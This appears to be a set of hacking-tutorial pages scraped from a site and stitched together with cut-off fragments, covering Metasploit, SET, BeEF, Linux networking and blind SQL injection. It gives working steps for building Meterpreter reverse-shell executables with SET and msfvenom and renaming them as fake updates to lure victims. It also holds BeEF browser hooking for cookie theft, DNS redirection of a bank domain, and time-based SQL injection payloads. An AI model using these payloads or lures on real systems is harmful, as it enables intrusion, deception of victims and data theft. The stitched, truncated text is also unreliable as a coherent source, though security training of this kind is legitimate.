This section will guide you through the process of creating a malicious EXE.\nSET has many options for malicious payloads, but they may be limited depending on the software and operating system versions the target is using\nGetting Started linkFrom the SET main menu, select one “Social-Engineering Attacks.” Choose three “Infectious Media Generator.”\nThere are two options inside the Infectious Media Generator, File-Format Exploits and Standard Metasploit Executable.\nFile-Format Exploits linkThis attack vector exploits vulnerabilities in popular formats like PDFs, Microsoft Office documents, and image files. Attackers craft malicious files containing embedded payloads that, when opened by unsuspecting users, exploit these vulnerabilities to gain unauthorized access to their systems.\nThe primary advantage of this approach is its stealthiness, as the malicious files often appear legitimate and are less likely to raise suspicion. Moreover, users perceive these file formats as harmless, making them more likely to be opened.\nThese are dependent on the OS version of the target system.\nStandard Metasploit Executable linkUsing the Metasploit Framework, this attack vector involves creating a standalone executable containing a malicious payload.\nWhen a user runs the executable, the payload is executed, and the attacker gains control over the target system. This approach is more straightforward than File-Format Exploits, as it doesn’t rely on exploiting specific vulnerabilities in file formats.\nHowever, it may also be more conspicuous, as users are generally more cautious when running unfamiliar executables. A successful attack using this vector often relies on strong social engineering techniques to convince the target to run the executable, such as disguising it as a software update, a useful utility, or a desirable file.\nChoosing the Standard Metasploit Executable linkYou will be asked to select the reverse shell you want to use. For this option, choose two, which is the Windows Meterpreter Reverse TCP shell. Enter the IP address and port for your listener.\nThe Social Engineering Toolkit will now create the malicious exe file, call it payload.exe, and save it to the /root/.set directory.\nYou can now rename the file to something else if you want. An attacker might change the name to something that will entice a victim to click on it, such as an update for an application.\nmv payload.exe "

                description: "Learn more about beEF",
                content: "BeEF, the Browser Exploitation Framework, is an indispensable tool for ethical hackers aiming to identify and exploit vulnerabilities within web browsers. While many security tools concentrate on system or server-side vulnerabilities, BeEF zeroes in on the client side—specifically, the user’s web browser. This focus is crucial because, regardless of the security measures implemented on a network or operating system, vulnerabilities in a web browser can still provide a gateway for attackers to infiltrate the system.\nIn contrast to other security tools that emphasize safeguarding networks or operating systems, BeEF’s specialty lies in exposing the often-overlooked weak points within web browsers. This distinction highlights the significant threat posed by browser vulnerabilities, which can undermine the security of an entire network. Ethical hackers leverage BeEF to simulate attacks, demonstrating how a seemingly secure system can be compromised through the user’s browser.\nBeEF’s interface is designed for ease of use, featuring a web-based dashboard that facilitates the control and monitoring of “hooked” web browsers. The core of BeEF’s functionality is the “hook.js” JavaScript file. Once this file is loaded by a target’s browser, it establishes a communication channel with the BeEF server, enabling the collection of extensive data about the browser environment. This includes browser type, version, installed plugins, and other critical information that can be used to identify potential vulnerabilities.\nFor ethical hackers, BeEF offers several distinct advantages. Firstly, it enables in-depth browser analysis, providing detailed insights into the hooked browsers. Information such as the browser type, version, installed plugins, and cookies can be invaluable for assessing security postures. Moreover, BeEF’s numerous command modules facilitate a range of client-side exploitation techniques. These modules can perform tasks such as stealing cookies, conducting social engineering attacks, and launching network attacks, among others.\nAdditionally, BeEF excels in simulating real-world attack scenarios, allowing organizations to better understand their risk exposures. By mimicking the tactics of malicious hackers, ethical hackers can use BeEF to test and improve their defenses. BeEF also offers the capability for persistent access, maintaining control over a hooked browser even if the IP address changes, thus providing ongoing access for further exploitation. Finally, BeEF’s user-friendly web-based interface simplifies the management of hooked browsers and execution of command modules, making it a powerful yet accessible tool for ethical hacking.\nGetting and Installing beEF linkYou can install beEF by running the commands:\nsudo apt update sudo apt install beef-xss Starting beEF linkOnce beEF is installed, you can run it by:\nsudo beef-xss When running the program for the first time, you will be prompted to change the default password for the ‘beef’ user.\nOnce you change the password, BeEF will start loading, and you will be presented with both the WebUI address and the hook script for hook.js.\nBeEF should open the browser for you, and you will need to log in as the user ‘beef’ with the new password you set up before entering the program.\nExploring the Different Sections within BeEF linkHooked Browsers linkThis section displays a list of all currently hooked browsers. Each browser entry includes details such as the IP address, browser name, and operating system. Initially, this section will be empty as no browsers are hooked.\nGetting Started linkThe Getting Started section offers guidance on utilizing the BeEF framework. It provides instructions on how to hook a browser and use the available command modules effectively.\nLogs linkThe Logs section records BeEF activity, including interactions with target browsers, commands sent, responses received, and any errors or important system messages. This log is crucial for tracking the framework’s operations and troubleshooting issues.\nZombies linkIn BeEF terminology, a “zombie” refers to a hooked browser under the control of the BeEF server. The Zombies section lists these browsers and enables interaction with them. Like the Hooked Browsers section, it will initially be empty until browsers are hooked.\nBasic linkThis view presents basic information about the hooked browser, such as its IP address, browser type, and operating system. From this view, you can also utilize available command modules to interact with the hooked browser.\nRequester linkThe Requester view allows you to manually craft and send HTTP requests from the hooked browser. This feature is useful for exploring websites or web applications from the hooked browser’s perspective, testing access controls, or conducting other manual testing tasks.\nOnce a browser is hooked, the Hooked Browsers and Zombies sections will populate with information, enabling you to interact with the hooked browsers using the BeEF command modules.\n"

                content: "Assuming you now have Metasploit installed, run the msfconsole command to open Metasploit:\nFinding Modules linkMetasploit is based around the concept of modules. The most commonly used module types are:\nAuxiliary - Auxiliary modules do not exploit a target, but can perform data gathering or administrative tasks Exploit - Exploit modules leverage vulnerabilities in a manner that allows the framework to execute arbitrary code on the target host Payloads - Arbitrary code that can be executed on a remote target to perform a task, such as creating users, opening shells, etc Post - Post modules are used after a machine has been compromised. They perform useful tasks such as gathering, collecting, or enumerating data from a session. You can use the search command to search for modules:\nsearch type:auxiliary http html title tag You can use a Metasploit module by specifying the full module name. The prompt will be updated to indicate the currently active module:\nExample:\nuse auxiliary/scanner/http/title Each module offers configurable options which can be viewed with the show options, or aliased options, command:\nshow options To set a module option, use the set command. We will set the RHOST option - which represents the target host(s) that the module will run against:\nset RHOSTS google.com The run command will run the module against the target, showing the target’s HTTP title:\nWe can also run modules with options set as part of the run command. For instance, setting both RHOSTS and enabling HttpTrace functionality:\nrun rhosts=google.com httptrace=true There is quite a lot of information on the output and you can scroll more to see it.\nRunning exploit modules linkExploit modules require a vulnerable target. It is recommended to set up your own local test environment to run modules against. For instance in a Virtual Machine, or with Docker. There are multiple pre-built vulnerable test environments including:\nMetasploitable2 Metasploitable3 For instance - targeting a vulnerable Metasploitable2 VM and using the unix/misc/distcc_exec module:\nuse unix/misc/distcc_exec Exploit modules will generally at a minimum require the following options to be set:\nRHOST - The remote target host address LHOST - The listen address. Important This may need to be set to your tun0 IP address or similar, if you are connecting to your target over a VPN PAYLOAD - The code to be executed after an exploit is successful. For instance creating a user, or a Metasploit session. Often this can be left as the default value, but may sometimes require configuration Each module offers configurable options which can be viewed with the show options, or aliased options, command:\nFor this scenario you can manually set each of the required option values (RHOST, LHOST, and optionally PAYLOAD):\nset rhost =\u003e 192.168.123.133 set lhost 192.168.123.1 set payload cmd/unix/reverse The run command will run the module against the target, there is also an aliased exploit command which will perform the same action:\nrun You have now learnt how to find and run modules in Metasploit, as well as how to make some custom configurations.\n"

Effective session management is crucial for streamlined operations during penetration testing. This guide covers the basics of managing sessions, navigating open sessions using search, and killing stale sessions.\nBasics of Session Management linkIn Metasploit, sessions represent ongoing interactions between the attacker and the compromised host. Managing these sessions efficiently ensures smooth operation and better control over the testing environment.\nSessions Command linkThe sessions command in Metasploit provides various options to list, interact with, and manage open sessions. Here are some common usages:\nList all sessions: msf6 \u003e sessions Interact with a specific session: msf6 \u003e sessions -i Session Search linkWhen multiple sessions are open, searching can help you navigate and manage them effectively. The sessions --search command allows you to filter sessions based on specific criteria.\nExample of Searching Sessions linkTo search for sessions with specific IDs:\nmsf6 \u003e sessions --search \"session_id:1 session_id:2\" Output:\nActive sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter x86/windows WIN-ED9KFH65RDH\\Zach Goldman @WIN-ED9KFH65RDH 192.168.2.1:4444 -\u003e 192.168.2.132:52190 (192.168.2.132) Supported Search Keywords linkCurrently, Metasploit supports the following search keywords:\nsession_id session_type last_checkin These keywords can be combined for more refined searches. For instance, to find sessions based on type and check-in time:\nmsf6 \u003e sessions --search \"session_id:1 session_type:meterpreter last_checkin:greater_than:10s last_checkin:less_than:10d5h2m30s\" -v Output:\nActive sessions =============== Session ID: 1 Name: Type: meterpreter windows Info: WIN-ED9KFH65RDH\\Zach Goldman @ WIN-ED9KFH65RDH Tunnel: 192.168.2.1:4444 -\u003e 192.168.2.132:52190 (192.168.2.132) Via: exploit/multi/handler Encrypted: Yes (AES-256-CBC) UUID: 958f7b976db67d60/x86=1/windows=1/2023-10-19T12:38:05Z CheckIn: 21725s ago @ 2023-10-19 09:26:08 -0500 Registered: No Using last_checkin linkThe last_checkin keyword requires an extra argument specifying whether to filter by greater or lesser time since the last check-in, followed by the time duration.\nExamples: link Greater than 10 seconds: last_checkin:greater_than:10s Less than 10 days, 5 hours, 2 minutes, and 30 seconds: last_checkin:less_than:10d5h2m30s Killing Stale Sessions linkYou can also use the --kill-all flag in conjunction with the --search command to kill sessions matching specific criteria.\nExample of Killing Stale Sessions linkTo kill all meterpreter sessions:\nmsf6 \u003e sessions -K -S \"session_type:meterpreter\" Output:\n[*] Killing matching sessions...

                title: "Networking in Linux",
                description: "Welcome to the basics of Linux for Hacking.",
                content: "As a hacker, networking is critical. We need to manage and manipulate our ability to connect with other computers to optimize our ability to compromise another machine. In some cases, you will need to connect but hide your IP address and other information. In this tutorial, I will attempt to show you the basics of networking in Linux.\nStep 1: Analyzing Networks and Network Interfaces linkThe most basic Linux command for analyzing networks is ifconfig. It’s very similar to the Windows command, ipconfig. Let’s take a look at it.\nkali \u003e ifconfig As you can see in this screenshot, ifconfig conveys a significant amount of information to the user. In the very first line, we see to the far left eth0. This is the first wired network connection, Ethernet 0 (Linux usually starts counting at 0 rather than 1. Get used to it if you are using Linux).\nFollowing this, we see the type of network being used (Ethernet) and the Hwaddr (this is the globally unique address stamped on every piece of network hardware, in this case, the network interface card or NIC). This is usually referred to as the MAC address.\nThe second line then contains information on the IP address, in this case, 192.168.181.131, the broadcast address (the address to send out information to all IPs on the subnet), and finally the network mask (this tells what part of the IP address is network and which part is hosts). There is a lot more technical info there, but it’s beyond the scope of a Linux basics tutorial.\nIf we look down below to what appears to be a second stanza or paragraph, we see the start of another paragraph with lo to the far left. This is the loopback address or localhost. This is the address of the machine you’re working on. You would use it if you simply wanted to test something like your own web server. It generally is represented with the IP address 127.0.0.1.\nFinally, in the third paragraph or stanza, we see an interface wlan0. This will only appear if you have a wireless interface or network adapter. In my case here, I obviously have a wireless adapter. Note that it also displays the MAC address of that device (Hwaddr).\nWhen we have a wireless adapter, we can gather information on it with the command iwconfig. This will be particularly important in wireless hacking.\nLet’s take a look at our wireless devices with iwconfig.\nkali \u003e iwconfig In my case, I have no wireless extensions, so there is not much information.\nThis command gives considerable information on our wireless devices. The only network interface with wireless extensions, as we would expect, is wlan0. Within that paragraph, we learn what 802.11 standard our device is capable of (bg), that it is in Mode:Managed (this contrasts with a monitor or promiscuous mode we will need for most wireless hacks), that it is Not-Associated with an Access Point (AP), and its power is 20dBm. We will spend more time with this information in the wireless hacking section.\nifup/ifdown linkNetwork interfaces can be activated or deactivated by using the ifup (activate) and ifdown (deactivate) commands. These commands are simply followed by the name of the interface we want to activate/deactivate, such as:\nkali \u003e ifdown eth0 When we deactivate the eth0 interface and then type the ifconfig command, we can see that the eth0 is no longer active and does not appear.\nStep 2: Changing IP Addresses linkChanging IP addresses can be fairly simple in Linux, I think much simpler than in the Windows GUI that requires multiple clicks. Remember that in most cases, you’re going to have a dynamically assigned address from a DHCP server (see below in section 3). In some cases, you may need to reassign the address, especially if you’re hacking. This can be useful in spoofing your IP address–making network forensics more challenging–but certainly not impossible.\nWe can do this by using the ifconfig command again with the interface we want to assign the IP to and the new IP address we want to assign to the interface. Such as:\nkali \u003e ifconfig eth0 192.168.181.115 Now, when we type ifconfig, we can see that our IP address has changed to the new IP address.\nWe can also change the netmask and broadcast address, if necessary, such as:\nkali \u003e ifconfig eth0 192.168.181.115 netmask 255.255.0.0 broadcast 192.168.1.255 Step 3: DHCP (Dynamic Host Configuration Server) linkLinux has a DHCP server that runs a daemon (daemon is simply a process that runs in the background in Linux) called dhcpd or dhcp daemon. It’s this DHCP server that assigns IP addresses to all the systems on the subnet. It also keeps log files of which machines had which IP addresses at which time. It’s this log that is often used to trace hackers in a forensic analysis after an attack.\nWhen I want my machine to be assigned a new address from the DHCP server, I can simply call the server with the command dhclient followed by the interface (different Linux distros use different DHCP clients, but Kali is built on Ubuntu which uses dhclient), like this:\nkali \u003e dhclient eth0 The dhclient command sends out a DHCPDISCOVER request from the default NIC. It then gets an offer (DHCPOFFER) of 192.168.181.131 from the DHCP server, then confirms the IP assignment to the DHCP server. Now, if we type ifconfig, we can see that the DHCP server has assigned a new IP address.\nStep 4: DNS (Domain Name Service) linkDNS, or Domain Name Services, is the service that enables us to type in a domain name like hackers-arise.com, which it then translates to the appropriate IP address. Without it, we would all have to remember thousands of IP addresses of our favorite websites (no small task even for a savant).\nOne of the most useful commands for the aspiring hacker is dig, which is the equivalent of nslookup in Windows but offers us much more information on the domain. For instance, if we dig hackers-arise.com and by adding the ns option, it will display the nameserver for hackers-arise.com.\nkali \u003e dig hackers-arise.com ns By using the dig command with the mx option, we can get info on the email servers for hackers-arise.com.\nkali \u003e dig google.com mx As a hacker, the dig command and using DNS to obtain information on our potential target can be a key piece of early reconnaissance before attacking.\nThe most common Linux DNS server is the Berkeley Internet Name Domain, or BIND. In some cases, Linux users will often refer to DNS as BIND, so don’t be confused. DNS or BIND simply maps individual domain names to IP addresses.\nOn our Kali system, we can point our DNS services to a local DNS server or a public DNS server. This pointing takes place in a plain text file named /etc/resolv.conf. Let’s open it with leafpad:\nkali \u003e leafpad /etc/resolv.conf As you can see in Line 3, the nameserver is set to a local DNS server at 192.168.181.2. That works fine, but if I wanted to add or replace that DNS server with, say, Google’s public DNS server at 8.8.8.8, we can either add a line in the /etc/resolv.conf to read:\nnameserver 8.8.8.8 Maybe more simply, we can use the command line to do the same by typing:\nkali \u003e echo \"nameserver 8.8.8.8\" \u003e /etc/resolv.conf As you can see above, our /etc/resolv.conf file points our DNS requests to Google’s DNS server now.\nWith this change, your system will now go out to the Google public DNS server to resolve domain names to IP addresses, rather than our local DNS server. This might take a bit more time, so to remedy this, you might keep your local DNS server followed by a public DNS server and the system will only go to the public DNS server if the domain name cannot be found in the local DNS server.\nhosts linkIn addition to the DNS servers, there is a hosts file in your Linux operating system. This hosts file enables us to put in our own IP address-domain name mapping, kind of like a static DNS service. In other words, we can determine where our browser/system goes when we type in Microsoft.com (or any other domain) rather than the DNS server. This can be useful as a hacker if we want to hijack a TCP connection on our local area network to direct traffic to our malicious web server with a tool\nsuch as dnspoof.\nBy default, this file only has our localhost at 127.0.0.1 and Kali at 127.0.1.1. We can add any IP/domain mapping we would like. For instance, in my dnsspoof tutorial, we mapped bankofamerica.com to our local website, say 192.168.181.131. This would then direct our traffic intended for bankofamerica.com to our web server, and if we are using dnspoof, it would direct anyone on our LAN to our web server at 192.168.181.131.\n"

                title: "Text Manipulation",
                description: "Welcome to the basics of Linux for Hacking.",
                content: "In Linux, nearly everything you deal with directly is a file, and most often these will be text files. For instance, all configuration files in Linux are text files. To reconfigure an application, you simply open the configuration file, change the text, save the file, and then restart the application—your reconfiguration is complete. With so many text files, manipulating text becomes crucial in managing Linux and Linux applications. In this chapter, you’ll use several commands and techniques for manipulating text in Linux.\nFor illustrative purposes, I’ll use files from the world’s best network intrusion detection system (NIDS), Snort, which was first developed by Marty Roesch and is now owned by Cisco. NIDSs are commonly used to detect intrusions by hackers, so if you want to be a successful hacker, you must be familiar with the ways NIDSs can deter attacks and the ways you can abuse them to avoid detection.\nNote: If the version of Kali Linux you’re using doesn’t come preinstalled with Snort, you can download the files from the Kali repository by entering:\napt-get install snort Viewing Files linkAs demonstrated in Chapter 1, the most basic text display command is probably cat, but it has its limitations. Use cat to display the Snort config file (snort.conf) found in /etc/snort:\nkali \u003e cat /etc/snort/snort.conf Your screen should now display the entire snort.conf file, which will stream until it comes to the end of the file, and should look something like the following:\n#------------------------------------------------- # VRT Rule Packages Snort.conf # # For more information visit us at: # http://www.snort.org Snort Website --snip-- # event thresholding or suppressions commands... This isn’t the most convenient or practical way to view and work with this file. In the following two sections, I will show you the head and tail commands, which are two methods for displaying just part of a file’s content to more easily view the key content.\nFinding the Head linkIf you just want to view the beginning of a file, you can use the head command. By default, this command displays the first 10 lines of a file. For instance, to show the first 10 lines of snort.conf:\nkali \u003e head /etc/snort/snort.conf The output will be:\n#------------------------------------------------- # VRT Rule Packages Snort.conf # # For more information visit us at: --snip-- # Snort bugs: bugs@snort.org If you want to see more or fewer than the default 10 lines, enter the quantity you want with the dash (-) switch after the call to head and before the filename. For example, to see the first 20 lines of the file:\nkali \u003e head -20 /etc/snort/snort.conf The output will be:\n#------------------------------------------------- # VRT Rule Packages Snort.conf # # For more information visit us at: --snip-- # Options : --enable-gre --enable-mpls --enable-targetbased --enable-ppm --enable-perfprofiling enable-zlib --enable-act live-response --enable-normalizer --enable-reload --enable-react You should see only the first 20 lines of snort.conf displayed in your terminal window.\nFinding the Tail linkThe tail command is similar to the head command, but it’s used to view the last lines of a file. Let’s use it on snort.conf:\nkali \u003e tail /etc/snort/snort.conf The output will be:\n#include $SO_RULE_PATH/smtp.rules #include $SO_RULE_PATH/specific-threats.rules #include $SO_RULE_PATH/web-activex.rules #include $SO_RULE_PATH/web-client.rules #include $SO_RULE_PATH/web-iis.rules #include $SO_RULE_PATH/web-miscp.rules #Event thresholding and suppression commands. Using these commands, you can efficiently manage and view parts of large text files, making text manipulation much easier in Linux.\nHow to use the stat command linkYou use the stat command to obtain detailed information about a file.\nstat The stat command provides information about the file name and extension, permissions, creation time, modification time, last access time, and more.\nNow is a great time to learn about permissions. If you run the commands ls -la or stat, you may see something like this: drwxrwxrwx. Let’s break it down.\nThe read (r) permission allows you to see the contents of a file, the write (w) permission allows you to modify the file, and the execute (x) permission allows you to run it as a process if it is a script or executable.\nThere are 3 classes of users that can access a file: user, group, and others. The root account is another class but is not considered here.\nEach ‘rwx’ set is owned by a permission class. If the space reads a letter, the set has that permission. If it has a dash, they do not have that permission.\nThe ‘d’ at the front represents whether it is a directory or a file. The ‘d’ means it’s a directory, and a dash (-) means it’s a file. Technically, a directory is a special type of file, but that’s a story for another day.\nHow to use the echo command linkYou use the echo command to print out input. Let’s use an example to make things clearer.\necho \"\" You can also use echo with the \u003e operator to write text to files.\nHow to use the grep command linkYou use the grep command to extract specified text from a file using the pipe operator.\ngrep \"\" The command above instructs the computer to print the contents of a file and, using the pipe operator, directs the grep command to use it as input. This process is called piping one command through another and can be done multiple times. The found text is shown in red.\ngrep is commonly used to search for specific text in large files. For example, if you are looking for credentials for a specific user in a file with a lot of text, you could use grep to search for keywords like ‘password’, ‘login’, and other relevant terms.\nHow to use the ‘help’ flag and man pages linkThe ‘help’ flag isn’t necessarily a command but it is a great aid if you are confused about an app or tool. Simply use the following:\n--help This will provide quick, bite-sized information about it. man, on the other hand, gives you all documented information about the app.\nman You may notice that in some cases, -h is used as the short form of the help flag. If it starts with a single dash, that’s the short form. If it starts with two dashes, it’s the long form.\n"

By observing the time it takes for the server to respond, the attacker can infer information about the database, even if there is no direct feedback from the database server.\nPurpose of Time-Based SQL Injection linkTime-based techniques are particularly useful for blind and deep blind SQL injection attacks where there is no other way to retrieve information from the database server. By injecting SQL code that induces a time delay, attackers can deduce information based on the time taken for the server to respond.\nInjecting a Time Delay linkTime-based attacks can be used to determine if a vulnerability is present. This is especially useful when facing deep blind SQL injection scenarios. The table below shows how to inject a time delay in various database management systems (DBMS).\nDBMS Function Notes MySQL SLEEP(time) Available since MySQL 5.0. Causes the query to sleep for the specified number of seconds. BENCHMARK(count, expr) Executes the expression a specified number of times, generating a delay. SQL Server WAIT FOR DELAY 'hh:mm:ss' Suspends execution for the specified amount of time. WAIT FOR TIME 'hh:mm:ss' Suspends execution until the system time matches the specified time. Oracle DBMS_LOCK.SLEEP(seconds) Used within PL/SQL blocks to suspend execution. Oracle does not support stacked queries in dynamic SQL. Note: Always identify the DBMS before beginning time-based tests. If none of the delay functions work, use database fingerprinting techniques to determine the DBMS.\nConditional Time Delays linkTime-based attacks can also extract information from the database by integrating the time delay into a conditional statement. This allows attackers to ask yes/no questions and deduce information based on whether the delay is executed or not.\nDBMS Conditional Syntax Notes MySQL IF(condition, when_true, when_false) Used in SQL statements. In stored procedures, use Oracle syntax. SQL Server IF condition THEN when_true ELSE when_false Used in stored procedures or independent stacked queries. Oracle IF condition THEN when_true ELSE when_false END IF Used in PL/SQL blocks. Examples of Time-Based SQL Injection linkMySQL Time-Based Attack linkInjecting a time delay in MySQL is straightforward using SLEEP() or BENCHMARK() functions.\nChecking for Vulnerability:\nSELECT * FROM products WHERE id=1 AND SLEEP(15); Extracting Information: To verify the database version:\nSELECT * FROM products WHERE id=1 AND IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0); SQL Server Time-Based Attack linkSQL Server requires the use of stacked queries to inject time delays.\nChecking for Vulnerability:\nSELECT * FROM products WHERE id=1; WAIT FOR DELAY '00:00:15'; Extracting Information: To check if the user is sa (system administrator):\nSELECT * FROM products WHERE id=1; IF SYSTEM_USER='sa' WAIT FOR DELAY '00:00:15'; Oracle Time-Based Attack linkOracle uses the DBMS_LOCK.SLEEP procedure within PL/SQL blocks.\nInjecting a Delay:\nBEGIN DBMS_LOCK.SLEEP(15); END; For dynamic SQL queries, inject heavy queries to induce a delay, as Oracle does not support stacked queries.\nPros and Cons of Time-Based Attacks linkPros link Minimal impact on logs compared to error-based attacks. Useful in deep blind SQL injection scenarios. Cons link Heavy queries or CPU-intensive functions like MySQL’s BENCHMARK() may alert system administrators. Requires careful calibration of delay length to account for server load and network speed, ensuring accurate results without excessively long testing times. Conclusion linkTime-based blind SQL injection attacks are a valuable technique for identifying and exploiting SQL injection vulnerabilities when other methods are not feasible. By inducing time delays and using conditional statements, attackers can infer critical information about the database, even without direct feedback. Always ensure responsible and ethical use of these techniques, and obtain proper authorization before conducting any tests.\n"

                content: "Overview linkIn some cases, it might be impossible to use time delay functions or procedures for classic time delay injections. In such situations, the best alternative is to simulate a delay using heavy queries, which take a noticeable amount of time to execute. This technique leverages the execution time of complex queries to infer information about the database.\nPrinciple linkThe injected query should rely on system tables, as the attacker usually has no information about user tables. The execution time is prolonged due to the large number of rows returned by the query. The time required to execute these queries can vary significantly based on factors like user permissions, database size, and server performance.\nHeavy Query Steps linkMySQL or SQL Server linkEven though MySQL and SQL Server support functions like SLEEP() to create delays, there might be cases where such functions or characters are blacklisted. In these scenarios, heavy queries can be used.\nHeavy MySQL Query Example:\nSELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C In a test environment, this query might return a large number, taking approximately 10 seconds to execute.\nInjection to Identify Vulnerability:\n1 AND 1\u003e(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C) Resulting Query:\nSELECT * FROM products WHERE id=1 AND 1\u003e(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C) If the server response takes noticeably longer, it indicates the presence of a vulnerability.\nOracle linkFor Oracle databases, heavy queries are often necessary for time-based SQL injections due to the lack of direct delay functions.\nHeavy Oracle Query Example:\nSELECT count(*) FROM all_users A, all_users B, all_users C In a test environment with a small number of users, this query might execute quickly. However, with a larger number of tables in the FROM clause, the execution time increases.\nInjection to Identify Vulnerability:\n1 AND 1\u003c(SELECT count(*) FROM all_users A, all_users B, all_users C) Resulting Query:\nSELECT * FROM products WHERE id=1 AND 1\u003c(SELECT count(*) FROM all_users A, all_users B, all_users C) A significant delay in server response indicates a potential vulnerability.\nAdditional Information linkUsing heavy queries can significantly impact CPU and server resources. Therefore, it’s generally better to use standard time delay techniques that are less CPU-intensive whenever possible.\nQuery Optimization linkDatabase optimizers execute the injected query once, store the results, and reuse the value when evaluating the WHERE clause against each record. This means the heavy query is not executed repeatedly, which is more efficient. However, if the optimizer detects that the WHERE clause is always false, it may skip the query execution altogether. To avoid this, ensure the WHERE clause is verified for at least one record.\nConclusion linkHeavy queries are a viable alternative to time delay functions for time-based blind SQL injection attacks, especially when delay functions are unavailable or blacklisted. By leveraging complex queries that take longer to execute, attackers can infer the presence of vulnerabilities. However, it is important to consider the impact on server resources and optimize the injected queries accordingly. Always ensure ethical use of these techniques and obtain proper authorization before conducting any tests.\n"

                description: "Welcome to the basics of Linux for Hacking.",
                content: "Linux employs a robust system to manage file access control. This system determines who can read, write, and execute any given file. It grants the file owner control over these permissions, allowing them to specify who can access their files. Group permissions can also be configured to manage access for specific user groups.\nViewing File Permissions\nThe ls command with the -l (long listing) option displays detailed information about files, including their permissions. Let’s navigate to the /usr/share/hashcat directory and use ls -l to examine file permissions there:\nkali \u003e cd /usr/share/hashcat kali \u003e ls -l Each line represents a file or directory entry, providing details like:\nFile type: A leading d indicates a directory, while - represents a regular file. Permissions: This section defines read (r), write (w), and execute (x) permissions for three categories: owner, group, and others. Number of links: The number of hard links pointing to the file. Owner: The username of the file owner. Group: The group name associated with the file. Size: The file size in bytes. Last modification time: The date and time the file was last modified. Filename: The name of the file. Understanding Permission Notation\nThe permissions section consists of three sets of characters: rwx. Each set applies to a specific user category:\nOwner: The first set represents the owner’s permissions. Group: The second set represents the group’s permissions. Others: The third set represents permissions for all other users. A - in a permission slot indicates the absence of that permission (e.g., no execute permission).\nExample: Analyzing Permissions\nLet’s examine the permissions for the hashcat rules directory:\n-rw-r--r-- Owner: Read (r) and write (w) permissions, but no execute (x) permission. Group: Read (r) permission only, no write or execute permissions. Others: Read (r) permission only, no write or execute permissions. Changing File Permissions\nThe chmod (change mode) command allows modifying file permissions, provided you have root privileges or are the file owner. Permissions are represented numerically in the operating system.\nPermissions as Binary Equivalents: Each permission (read, write, execute) translates to a binary value: Read (r): 4 Write (w): 2 Execute (x): 1 Adding these values determines the numerical permission representation. For example, all permissions enabled (rwx) translates to 4 + 2 + 1 = 7.\nChanging Permissions with Numbers: To give the group write permission to the hashcat combinator.rule file (assuming its current permissions are rw-r--r-- which translates to 644), you would use: kali \u003e chmod 664 combinator.rule This command grants the owner read and write (4 + 2 = 6), the group read and write (4 + 2 = 6), and everyone else read-only (4) permissions.\nAlternative: Using UGO Syntax\nAnother method for changing permissions involves the UGO syntax:\nUGO: Stands for User (owner), Group, and Others. Operators: +: Add a permission. -: Remove a permission. =: Set a permission. For instance, to remove write permission for the group on combinator.rule:\nkali \u003e chmod g-w combinator.rule Giving Yourself Execute Permission on New Tools\nDownloaded hacking tools often lack execute permission by default. To grant yourself (assuming you’re root) permission to execute a new tool named newhackertool:\nkali \u003e chmod 766 newhackertool This assigns you (the owner) all permissions (read, write, execute), and the group and others read-write permissions only (6).\nRemember: Always exercise caution when modifying file permissions, especially on critical system files.\n"

                content: "Understanding How Payloads Work in Metasploit linkThe Metasploit Framework is a powerful tool used for developing, testing, and executing exploits against remote targets. One of the critical components in this process is the payload. This blog post aims to break down the functionality of payloads in Metasploit, explaining their types and how they are used.\nWhat are Payloads? linkIn Metasploit, payloads are modules that are used to execute code on a target system. They are stored in the directory modules/payloads/{singles, stages, stagers}/. When the framework starts, it combines stages with stagers to create a complete payload ready for use in exploits. Handlers are then paired with these payloads to manage the sessions and communication mechanisms.\nNaming Conventions linkPayloads in Metasploit are given reference names that describe their components:\nStaged payloads: /[arch]// Single payloads: /[arch]/ For example, the payload windows/x64/meterpreter/reverse_tcp breaks down as follows:\nPlatform: Windows Architecture: x64 Stage: Meterpreter Stager: Reverse TCP In some cases, the architecture might be optional. For instance, php/meterpreter/reverse_tcp does not include an architecture because PHP payloads deliver interpreted code rather than native binaries.\nTypes of Payloads linkSingles linkSingle payloads are “fire-and-forget.” They execute the payload code immediately without requiring any further communication with the Metasploit framework. This type of payload is useful in scenarios where the target has no network access, such as when using a file format exploit delivered via a USB drive.\nStagers linkStagers are small payloads designed to establish a communication channel and then load a larger, more complex payload. Using a stager allows for the initial payload to be small and quick to execute, which is useful for bypassing size restrictions and avoiding detection. The stager sets up the communication channel and passes control to the next stage, which is the more significant part of the payload.\nStages linkStages are the larger payloads that the stager loads into memory. They can be arbitrarily large since the stager handles any size restrictions. This allows stages to be written in higher-level languages like C, providing more functionality and complexity in the final payload.\nDelivering Staged Payloads linkWhen delivering staged payloads, the IP address and port that the payload should connect back to are embedded in the stager. All staged payloads consist of a small stub that sets up communication and executes the next stage.\nTo create an executable using a staged payload, you would use the following commands in Metasploit’s msfvenom:\nmsfvenom -f exe LHOST=192.168.1.1 -p windows/meterpreter/reverse_tcp msfvenom -f exe LHOST=192.168.1.1 -p windows/shell/reverse_tcp msfvenom -f exe LHOST=192.168.1.1 -p windows/vncinject/reverse_tcp These commands create functionally identical executable files that differ only in randomization elements, making them unique.\nCommunication Mechanisms linkThe Ruby side of Metasploit acts as a client, using the transport mechanism set up by the stager (e.g., TCP, HTTP, HTTPS). Depending on the type of stage used:\nShell Stage: Metasploit connects the remote process’s standard input/output to your terminal. Meterpreter Stage: Metasploit communicates using the Meterpreter protocol, offering more advanced features like file system navigation and command execution. Conclusion linkUnderstanding how payloads work in Metasploit is crucial for effectively using the framework to exploit and manage remote systems. By combining singles, stagers, and stages, Metasploit allows for flexible and powerful payload delivery, making it a versatile tool for penetration testers and security professionals.\nBy mastering the components and delivery methods of Metasploit payloads, you can leverage the full capabilities of this powerful framework in your security assessments and exploit development.\n"

